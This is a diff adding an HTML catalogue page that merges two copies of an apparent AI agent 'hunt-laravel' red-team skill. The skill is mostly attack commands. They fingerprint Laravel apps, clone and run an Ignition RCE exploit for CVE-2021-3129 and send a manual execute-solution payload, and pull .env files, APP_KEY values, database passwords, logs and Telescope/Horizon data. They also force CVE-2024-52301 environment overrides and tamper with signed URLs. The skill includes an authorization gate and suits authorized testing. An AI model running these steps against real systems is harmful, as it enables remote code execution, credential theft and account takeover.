@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-laravel</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">laravel-vuln-hunt</a> / hunt-laravel</p><h1>hunt-laravel</h1><p class="meta">combined</p><p>Both copies implement the same Laravel red-team procedure (fingerprinting, Ignition RCE, Telescope/Horizon, .env/APP_KEY, signed URLs). The uphiago copy is the more complete, self-contained procedure with explicit timeouts and a signed-URL phase, while the sickn33 copy adds a mandatory authorization gate and an extra CVE-2024-52301 environment-override phase that the other lacks. Crowning one would hide either the authorization constraint or the additional CVE, so the copies should be combined.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-laravel/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-laravel/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-laravel/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-laravel/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-laravel/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-laravel/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-laravel
+description: Hunt Laravel specific vulnerabilities — Debug mode leakage, Laravel Telescope/Horizon dashboard unauthorized access, Ignition RCE (CVE-2021-3129), Signed URL manipulation, Queue Worker abuse, mass assignment via Eloquent, deserialization via cookies, .env file exposure, and environment override via query args (CVE-2024-52301). Use when target runs Laravel (PHP) — detected via X-Powered-By, Laravel session cookies, or /storage/ paths.
+version: 1.2.0
+license: MIT
+category: security
+risk: offensive
+tags: [laravel, hunt, redteam, php]
+---
+
+# HUNT-LARAVEL — Laravel Specific Vulnerabilities
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+## Crown Jewel Targets
+
+Laravel debug mode enabled in production = instant RCE via Ignition (CVE-2021-3129).
+
+**Highest-value findings:**
+- **Ignition RCE (CVE-2021-3129)** — `APP_DEBUG=true` + Laravel &lt; 8.4.2 → `/_ignition/execute-solution` RCE without auth
+- **Telescope dashboard** — `/telescope` exposes full request/response logs, DB queries, Redis commands, scheduled jobs, environment variables
+- **Horizon dashboard** — `/horizon` exposes queue job details, failed jobs with full payloads (may contain API keys, PII)
+- **Signed URL manipulation** — if `URL::signedRoute` validates wrong params → bypass signed URL → unauthorized actions
+- **.env exposure** — `APP_KEY` leaked → decrypt all encrypted cookies → forge session → ATO
+- **Environment override (CVE-2024-52301)** — `?--env=local` flips app into local/testing config when `register_argc_argv=On`
+
+---
+
+## Phase 1 — Fingerprint Laravel
+
+```bash
+# Laravel-specific indicators
+curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i &quot;laravel_session\|x-powered-by.*php&quot;
+curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -i &quot;laravel\|Illuminate\|csrf-token&quot;
+
+# Common Laravel paths
+for path in /storage /public /resources &quot;/vendor/laravel&quot; &quot;/.env&quot; &quot;/artisan&quot;; do
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &quot;%{http_code}&quot; &quot;https://$TARGET$path&quot;)
+  [ &quot;$STATUS&quot; != &quot;404&quot; ] &amp;&amp; echo &quot;$path: $STATUS&quot;
+done
+
+# Check error page (trigger 404)
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/definitely-does-not-exist-xyz&quot; | grep -i &quot;laravel\|Whoops\|Ignition\|symfony&quot;
+```
+
+---
+
+## Phase 2 — Debug Mode &amp; Ignition RCE (CVE-2021-3129)
+
+```bash
+# Step 1: Check if debug mode is enabled (Whoops error page)
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/nonexistent&quot; | grep -i &quot;Whoops\|APP_DEBUG\|Ignition&quot;
+
+# If Whoops/Ignition is visible → debug mode ON → test CVE-2021-3129
+
+# Step 2: Check Ignition endpoint
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/_ignition/health-check&quot; | head -5
+
+# Step 3: CVE-2021-3129 — Laravel &lt; 8.4.2 RCE via log file manipulation
+# (Requires debug mode + writable storage/logs)
+# Tool: ambionics/laravel-ignition-rce
+git clone https://github.com/ambionics/laravel-ignition-rce /tmp/laravel-rce
+php /tmp/laravel-rce/exploit.php https://$TARGET &quot;id&quot;
+
+# Manual test — send solution request
+curl --max-time 30 --connect-timeout 10 -s -X POST &quot;https://$TARGET/_ignition/execute-solution&quot; \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{
+    &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
+    &quot;parameters&quot;: {
+      &quot;variableName&quot;: &quot;x&quot;,
+      &quot;viewFile&quot;: &quot;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&quot;
+    }
+  }&#x27;
+```
+
+---
+
+## Phase 3 — Laravel Telescope &amp; Horizon
+
+```bash
+# Telescope — request/response logs, DB queries, jobs, cache, events
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/telescope&quot; | grep -i &quot;telescope\|laravel&quot;
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/telescope/api/requests&quot; | python3 -m json.tool 2&gt;/dev/null | head -50
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/telescope/api/commands&quot; | python3 -m json.tool 2&gt;/dev/null | head -30
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/telescope/api/redis&quot; | python3 -m json.tool 2&gt;/dev/null | head -30
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/telescope/api/environment&quot; | python3 -m json.tool 2&gt;/dev/null | head -50
+
+# Horizon — queue worker dashboard
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/horizon&quot; | grep -i &quot;horizon\|laravel&quot;
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/horizon/api/stats&quot; | python3 -m json.tool 2&gt;/dev/null
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/horizon/api/jobs/failed&quot; | python3 -m json.tool 2&gt;/dev/null | head -50
+# Failed job payloads often contain full request data including auth tokens
+
+# Common paths
+for path in /telescope /telescope/requests /telescope/api /horizon /horizon/api/stats; do
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &quot;%{http_code}&quot; &quot;https://$TARGET$path&quot;)
+  [ &quot;$STATUS&quot; = &quot;200&quot; ] &amp;&amp; echo &quot;[+] ACCESSIBLE: $TARGET$path&quot;
+done
+```
+
+---
+
+## Phase 4 — .env File &amp; APP_KEY Exposure
+
+```bash
+# Direct .env access
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/.env&quot; | grep -i &quot;APP_KEY\|DB_PASSWORD\|SECRET\|KEY&quot;
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/.env.production&quot;
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/.env.backup&quot;
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/.env.local&quot;
+
+# If APP_KEY found:
+APP_KEY=&quot;base64:XXXXXXX&quot;
+echo &quot;APP_KEY=$APP_KEY&quot;
+# → Can decrypt all Laravel encrypted cookies
+# → Can forge session cookies → ATO for any user
+
+# Also check
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/storage/logs/laravel.log&quot; | tail -100 | grep -i &quot;exception\|error\|key\|password&quot;
+```
+
+---
+
+## Phase 4b — Environment override via query args (CVE-2024-52301)
+
+When `register_argc_argv=On` (php.ini), Laravel parses the query-string as CLI args, so `?--env=` overrides `APP_ENV` over HTTP -&gt; flip the app into `local`/`testing` config (debug on, seeded creds, weaker guards).
+
+```bash
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/?--env=local&quot;          # force debug/local config
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/?--env=testing&quot;        # force testing config
+```
+
+---
+
+## Phase 5 — Signed URL Manipulation
+
+```bash
+# Laravel signed URLs contain signature param: ?signature=HASH
+# Find signed URL endpoints
+cat recon/$TARGET/urls.txt | grep &quot;signature=&quot;
+
+# Test: modify a non-signature parameter — should fail validation
+SIGNED_URL=&quot;https://$TARGET/unsubscribe?user=123&amp;email=test@test.com&amp;signature=VALID_SIG&quot;
+
+# Modify user ID → should fail if properly signed
+curl --max-time 30 --connect-timeout 10 -s &quot;${SIGNED_URL/user=123/user=999}&quot;
+
+# Test signature bypass: remove signature param
+curl --max-time 30 --connect-timeout 10 -s &quot;https://$TARGET/unsubscribe?user=123&amp;email=test@test.com&quot;
+```
+
+---
+
+## Conflicts
+
+- **uphiago/recon-skills** includes explicit `--max-time 30 --connect-timeout 10` on all curl commands; **sickn33/agentic-awesome-skills** omits these timeouts. The combined instruction uses the explicit timeouts from uphiago/recon-skills.
+- **sickn33/agentic-awesome-skills** includes a mandatory authorization confirmation gate before any probing; **uphiago/recon-skills** does not include this gate. The combined instruction includes the authorization gate from sickn33/agentic-awesome-skills.
+- **sickn33/agentic-awesome-skills** includes Phase 4b for CVE-2024-52301 environment override via query args; **uphiago/recon-skills** does not include this phase. The combined instruction includes Phase 4b from sickn33/agentic-awesome-skills.</pre>
+</body>
+</html>
